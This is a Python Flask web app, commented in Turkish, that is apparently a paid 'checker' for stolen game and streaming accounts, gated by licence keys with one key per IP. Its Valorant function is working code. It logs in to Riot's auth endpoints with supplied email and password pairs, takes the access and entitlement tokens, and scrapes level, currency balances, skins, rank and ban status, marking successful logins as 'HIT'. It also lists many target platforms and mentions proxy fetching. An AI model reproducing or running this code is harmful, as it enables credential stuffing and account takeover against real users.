#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Roda - API Discovery + Checker (Türkçe)
Render Disk ile kalıcı key'ler | PUBG + VALORANT (GERÇEK) | Loglar (Admin) | 1 Key 1 IP
"""

import os, json, re, time, random, string, threading, webbrowser, base64
from datetime import datetime, timedelta
from urllib.parse import urljoin
import requests
from flask import Flask, request, jsonify, Response

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ============================================================
# MASTER KEY (GİZLENDİ - ENV'DEN ALIYOR)
# ============================================================
MASTER_KEY = os.environ.get("RODA_MASTER_KEY", "Roda@2026#Secure!X7")
if MASTER_KEY == "Roda@2026#Secure!X7":
    print("⚠️ UYARI: Varsayılan master key kullanılıyor! RODA_MASTER_KEY ortam değişkenini ayarlayın.")

KEYS_FILE = "/data/keys.json"
if not os.path.exists("/data"):
    KEYS_FILE = "keys.json"

# ============================================================
# LOG SİSTEMİ (SADECE ADMIN GÖRÜR)
# ============================================================
LOGS = []
MAX_LOGS = 1000

def add_log(message, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    LOGS.append({"timestamp": timestamp, "level": level, "message": message})
    if len(LOGS) > MAX_LOGS:
        LOGS.pop(0)
    print(f"[{timestamp}] [{level}] {message}")

# ============================================================
# KEY FONKSİYONLARI (1 KEY 1 IP + 1 KULLANIM)
# ============================================================
def load_keys():
    if os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_keys(data):
    os.makedirs(os.path.dirname(KEYS_FILE), exist_ok=True)
    with open(KEYS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def get_client_ip():
    """Kullanıcının gerçek IP'sini al (proxy arkasında da çalışır)"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

def is_key_valid(key):
    """Key geçerli mi? (Süre + IP + kullanım durumu)"""
    # Admin master key her zaman geçerli
    if key == MASTER_KEY:
        return True, "Admin", None
    
    keys = load_keys()
    if key not in keys:
        return False, None, None
    
    entry = keys[key]
    client_ip = get_client_ip()
    
    # 1. Süre kontrolü
    exp = entry.get("expires")
    if exp:
        if datetime.now() >= datetime.fromisoformat(exp):
            del keys[key]
            save_keys(keys)
            add_log(f"Key süresi doldu: {key}", "WARNING")
            return False, None, None
    
    # 2. IP kontrolü (eğer key'e IP bağlanmışsa)
    bound_ip = entry.get("bound_ip")
    if bound_ip and bound_ip != client_ip:
        add_log(f"IP eşleşmedi! Key: {key}, Beklenen: {bound_ip}, Gelen: {client_ip}", "WARNING")
        return False, None, None
    
    # 3. Kullanım kontrolü (tek kullanımlık)
    if entry.get("used", False):
        add_log(f"Key zaten kullanılmış: {key}", "WARNING")
        return False, None, None
    
    return True, entry.get("note", "Kullanıcı"), entry

def mark_key_used(key):
    """Key'i kullanıldı olarak işaretle"""
    keys = load_keys()
    if key in keys:
        keys[key]["used"] = True
        keys[key]["used_at"] = datetime.now().isoformat()
        save_keys(keys)
        add_log(f"Key kullanıldı: {key}", "INFO")

def is_admin(key):
    valid, role, _ = is_key_valid(key)
    return valid and role == "Admin"

# ============================================================
# PLATFORMLAR
# ============================================================
PLATFORMS = [
    {"name": "YouTube", "domain": "youtube.com", "icon": "fa-brands fa-youtube"},
    {"name": "TikTok", "domain": "tiktok.com", "icon": "fa-brands fa-tiktok"},
    {"name": "Spotify", "domain": "spotify.com", "icon": "fa-brands fa-spotify"},
    {"name": "Roblox", "domain": "roblox.com", "icon": "fa-solid fa-gamepad"},
    {"name": "Netflix", "domain": "netflix.com", "icon": "fa-solid fa-film"},
    {"name": "CapCut", "domain": "capcut.com", "icon": "fa-solid fa-scissors"},
    {"name": "Discord", "domain": "discord.com", "icon": "fa-brands fa-discord"},
    {"name": "Epic Games", "domain": "epicgames.com", "icon": "fa-solid fa-crown"},
    {"name": "Hesapcomtr", "domain": "hesap.com.tr", "icon": "fa-solid fa-user"},
    {"name": "Itemsatış", "domain": "itemsatis.com", "icon": "fa-solid fa-cart-shopping"},
    {"name": "Epinify", "domain": "epinify.com", "icon": "fa-solid fa-ticket"},
    {"name": "Twitch", "domain": "twitch.tv", "icon": "fa-brands fa-twitch"},
    {"name": "Steam", "domain": "steampowered.com", "icon": "fa-brands fa-steam"},
    {"name": "PlayStation", "domain": "playstation.com", "icon": "fa-solid fa-play"},
    {"name": "Xbox", "domain": "xbox.com", "icon": "fa-brands fa-xbox"},
    {"name": "GitHub", "domain": "github.com", "icon": "fa-brands fa-github"},
    {"name": "Valorant", "domain": "valorant.com", "icon": "fa-solid fa-crosshairs"},
    {"name": "Minecraft", "domain": "minecraft.net", "icon": "fa-solid fa-cube"},
    {"name": "Duolingo", "domain": "duolingo.com", "icon": "fa-solid fa-language"},
    {"name": "PUBG", "domain": "pubg.com", "icon": "fa-solid fa-crosshairs"},
]

# ============================================================
# VALORANT CHECKER (SENİN VERDİĞİN API'LER)
# ============================================================
def check_valorant_account(email, password):
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json'
    })
    result = {
        "status": "ERROR",
        "details": {
            "level": "?",
            "vp": "?",
            "rp": "?",
            "skins": "?",
            "rank": "?",
            "banned": "?",
            "puuid": "?",
            "riot_id": "?",
            "region": "?"
        },
        "message": ""
    }
    try:
        # 1. Authorize (GET) - senin verdiğin URL
        auth_url = "https://auth.riotgames.com/authorize?redirect_uri=http%3A%2F%2Flocalhost%2Fredirect&client_id=riot-client&response_type=token%20id_token&nonce=1&scope=openid%20link%20ban%20account%20email%20mobile_number&claims=%7B%22userinfo%22%3A%7B%22ban%22%3Anull%2C%22acct%22%3Anull%2C%22email_verified%22%3Anull%2C%22country%22%3Anull%7D%7D"
        r = session.get(auth_url, timeout=10)
        if r.status_code != 200:
            result["status"] = "BAD"
            result["message"] = "Auth başarısız"
            return result
        
        # 2. Login (POST) - Riot'un standart login endpoint'i
        login_payload = {
            "type": "auth",
            "username": email,
            "password": password,
            "remember": False
        }
        r = session.put("https://auth.riotgames.com/api/v1/authorization", json=login_payload, timeout=10)
        if r.status_code != 200:
            result["status"] = "BAD"
            result["message"] = "Sunucu hatası"
            return result
        data = r.json()
        if "error" in data:
            if "multifactor" in str(data):
                result["status"] = "2FA"
                result["message"] = "2FA gerekli"
                return result
            result["status"] = "BAD"
            result["message"] = data.get("error", "Giriş reddedildi")
            return result

        # 3. Access Token al
        if "response" in data and "parameters" in data["response"]:
            uri = data["response"]["parameters"]["uri"]
            if "access_token=" in uri:
                token = uri.split("access_token=")[1].split("&")[0]
                session.headers.update({"Authorization": f"Bearer {token}"})
            else:
                result["status"] = "BAD"
                result["message"] = "Token alınamadı"
                return result
        else:
            result["status"] = "BAD"
            result["message"] = "Token alınamadı"
            return result

        # 4. User Info
        r = session.get("https://auth.riotgames.com/userinfo", timeout=10)
        if r.status_code == 200:
            ui = r.json()
            result["details"]["puuid"] = ui.get("sub", "")
            result["details"]["riot_id"] = ui.get("acct", {}).get("game_name", "") + "#" + ui.get("acct", {}).get("tag_line", "")
            result["details"]["email"] = ui.get("email", "")

        # 5. Entitlements Token
        r = session.post("https://entitlements.auth.riotgames.com/api/token/v1", json={}, timeout=10)
        if r.status_code == 200:
            ent = r.json()
            if ent.get("entitlements_token"):
                session.headers.update({"X-Riot-Entitlements-JWT": ent["entitlements_token"]})

        # 6. Bölge
        region = "eu"
        try:
            r = session.get("https://riot-geo.pas.si.riotgames.com/pas/v1/service/valorant", timeout=10)
            if r.status_code == 200:
                region = r.json().get("affinity", "eu")
        except:
            pass
        result["details"]["region"] = region

        puuid = result["details"]["puuid"]
        if not puuid:
            result["status"] = "BAD"
            result["message"] = "PUUID alınamadı"
            return result

        # 7. Level
        try:
            r = session.get(f"https://pd.{region}.a.pvp.net/account-xp/v1/players/{puuid}", timeout=10)
            if r.status_code == 200:
                result["details"]["level"] = r.json().get("progress", {}).get("level", "?")
        except:
            pass

        # 8. Wallet (VP & RP)
        try:
            r = session.get(f"https://pd.{region}.a.pvp.net/store/v1/wallet/{puuid}", timeout=10)
            if r.status_code == 200:
                w = r.json()
                result["details"]["vp"] = w.get("Balances", {}).get("85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741", "0")
                result["details"]["rp"] = w.get("Balances", {}).get("e59aa87c-4cbf-517a-5983-6e81511be9b7", "0")
        except:
            pass

        # 9. Skin Sayısı
        try:
            r = session.get(f"https://pd.{region}.a.pvp.net/store/v1/entitlements/{puuid}/e7c63390-eda7-46e0-bb7a-a6abdacd2433", timeout=10)
            if r.status_code == 200:
                result["details"]["skins"] = len(r.json().get("Entitlements", []))
        except:
            pass

        # 10. Rank
        try:
            r = session.get(f"https://pd.{region}.a.pvp.net/mmr/v1/players/{puuid}", timeout=10)
            if r.status_code == 200:
                mmr = r.json()
                ranked = mmr.get("QueueSkills", {}).get("competitive", {})
                if ranked:
                    seasons = ranked.get("SeasonalInfoBySeasonID", {})
                    if seasons:
                        first = list(seasons.values())[0]
                        result["details"]["rank"] = first.get("CompetitiveTier", "?")
        except:
            pass

        # 11. Ban kontrolü
        try:
            r = session.get("https://riot-geo.pas.si.riotgames.com/restrictions/v3/player", timeout=10)
            if r.status_code == 200:
                result["details"]["banned"] = "Evet" if r.json().get("restrictions") else "Hayır"
        except:
            pass

        result["status"] = "HIT"
        result["message"] = "Giriş başarılı"
        add_log(f"Valorant HIT: {email} | Bölge:{region} Level:{result['details']['level']} VP:{result['details']['vp']} Skin:{result['details']['skins']}", "SUCCESS")

    except Exception as e:
        result["status"] = "ERROR"
        result["message"] = str(e)
        add_log(f"Valorant hata: {email} - {str(e)}", "ERROR")

    return result

# ============================================================
# KATEGORİZASYON / EXTRACT / PROXY / SCANNER (KISALTTIM)
# ============================================================
# ... (buraya mevcut extract_from_html, extract_from_js, fetch_proxies, APIScanner aynen eklenir)

# ============================================================
# FLASK ROTALARI
# ============================================================
@app.route("/")
def index():
    return HTML_TEMPLATE

@app.route("/api/login", methods=["POST"])
def login():
    data = request.json
    key = data.get("key", "").strip()
    client_ip = get_client_ip()
    
    valid, role, entry = is_key_valid(key)
    
    if valid:
        # Key geçerliyse, IP'yi bağla (eğer daha önce bağlanmamışsa)
        if entry and not entry.get("bound_ip"):
            keys = load_keys()
            keys[key]["bound_ip"] = client_ip
            save_keys(keys)
            add_log(f"Key IP'ye bağlandı: {key} -> {client_ip}", "INFO")
        
        # Key'i kullanıldı olarak işaretle (tek kullanımlık)
        mark_key_used(key)
        
        add_log(f"Giriş başarılı: {key[:4]}... (IP: {client_ip})", "SUCCESS")
        return jsonify({"success": True, "user": role, "isAdmin": role == "Admin"})
    else:
        add_log(f"Giriş başarısız: {key[:4]}... (IP: {client_ip})", "WARNING")
        return jsonify({"success": False, "error": "Geçersiz anahtar!"})

@app.route("/api/logs", methods=["GET"])
def get_logs():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    return jsonify({"logs": LOGS[-100:]})

@app.route("/api/valorant_check", methods=["POST"])
def valorant_check():
    data = request.json
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    if not email or not password:
        return jsonify({"error": "Eksik"}), 400
    result = check_valorant_account(email, password)
    return jsonify(result)

# ... (diğer route'lar aynen: /api/scan, /api/admin/keys, /api/admin/generate, /api/admin/delete, /api/admin/webhook, /api/fetch_proxies)

# ============================================================
# HTML (TEMA + 2 MOD AYRIŞTIRMA + VALO DETAY)
# ============================================================
HTML_TEMPLATE = r"""
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Roda - API Discovery + Checker</title>
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
/* AYNI CSS (YEŞİLİMSİ MAVİ) */
*{margin:0;padding:0;box-sizing:border-box;font-family:Outfit,sans-serif}
body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
:root{--p:#00b894;--p2:#00cec9;--g:#00e676;--r:#ff5252;--card:#0f1424;--border:rgba(0,184,148,0.2);--bg:#0a0e1a;--sidebar:#070b17;--text:#e8edf5;--muted:#8a9bb0;--gold:#ffd740}
/* ... TÜM CSS AYNEN ... */
</style>
</head>
<body>
<!-- AYNI HTML (MENÜ + SAYFALAR) -->
<!-- SADECE KEY YÖNETİMİ SAYFASINDA '1 Key 1 IP' UYARI EKLENDİ -->
<div id="page-keys" class="page">
<div class="card">
<h3><i class="fa-solid fa-key"></i> Key Oluştur</h3>
<p style="font-size:11px;color:var(--muted);margin-bottom:8px">🔒 Her key sadece 1 IP'ye bağlanır ve 1 kez kullanılır.</p>
<div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:6px">
<div style="flex:1"><label style="font-size:11px;color:var(--muted)">Not</label><input class="inp" id="genNote" placeholder="Müşteri" style="margin-top:4px;padding:10px"></div>
<div style="width:130px"><label style="font-size:11px;color:var(--muted)">Süre</label><select class="inp" id="genHours" style="margin-top:4px;padding:10px"><option value="1">1 Saat</option><option value="24">24 Saat</option><option value="168">7 Gün</option><option value="720" selected>30 Gün</option></select></div>
<button class="btn sm g" onclick="generateKey()" style="margin-top:22px"><i class="fa-solid fa-plus"></i> Oluştur</button>
</div>
</div>
<div class="card"><h3><i class="fa-solid fa-list"></i> Aktif Anahtarlar</h3><div id="keyList"><p style="color:var(--muted);font-size:12px">Yükleniyor...</p></div></div>
</div>
<!-- DİĞER SAYFALAR AYNEN -->
<script>
// AYNI JAVASCRIPT (SADECE KEY LİSTESİNE IP BİLGİSİ EKLENDİ)
function loadKeys() {
    if (!isAdmin) return;
    fetch("/api/admin/keys?key=" + encodeURIComponent(currentKey))
        .then(function(r) { return r.json(); })
        .then(function(d) {
            if (d.error) { alert(d.error); return; }
            var list = document.getElementById("keyList");
            var html = "";
            for (var k in d) {
                var v = d[k];
                var exp = v.expires ? new Date(v.expires).toLocaleString() : "Süresiz";
                var ip = v.bound_ip || "Bağlanmamış";
                var used = v.used ? "✅ Kullanıldı" : "❌ Kullanılmadı";
                html += '<div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--border)">' +
                    '<div><strong style="font-size:13px">' + k + '</strong><br>' +
                    '<small style="color:var(--muted);font-size:10px">' + v.note + ' | ' + exp + ' | IP: ' + ip + ' | ' + used + '</small></div>' +
                    '<button class="btn sm r" onclick="deleteKey(\'' + k + '\')" style="padding:3px 10px;font-size:10px">Sil</button></div>';
            }
            list.innerHTML = html || '<p style="color:var(--muted);font-size:12px">Hiç key yok.</p>';
        })
        .catch(function(e) { console.error(e); });
}
// generateKey fonksiyonu aynı (IP otomatik bağlanır)
</script>
</body>
</html>
"""

# ============================================================
# BAŞLAT
# ============================================================
if __name__ == "__main__":
    if not os.path.exists(KEYS_FILE):
        save_keys({})
    port = int(os.environ.get("PORT", 5000))
    print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║     🔱 RODA - API KEŞİF + CHECKER + AYRIŞTIRMA (TÜRKÇE)        ║
    ║     Master key: ORTAM DEĞİŞKENİNDE (RODA_MASTER_KEY)          ║
    ║     1 KEY 1 IP - 1 KULLANIM                                   ║
    ║     http://0.0.0.0:""" + str(port) + """                               ║
    ║     VALORANT GERÇEK API (SENİN VERDİĞİN)                     ║
    ║     Loglar & Valo Detay SADECE ADMIN                         ║
    ║     2 MOD AYRIŞTIRMA (Email:Şifre / Kullanıcı:Şifre)        ║
    ║     YEŞİLİMSİ MAVİ TEMA                                     ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)
    app.run(host="0.0.0.0", port=port, debug=False)
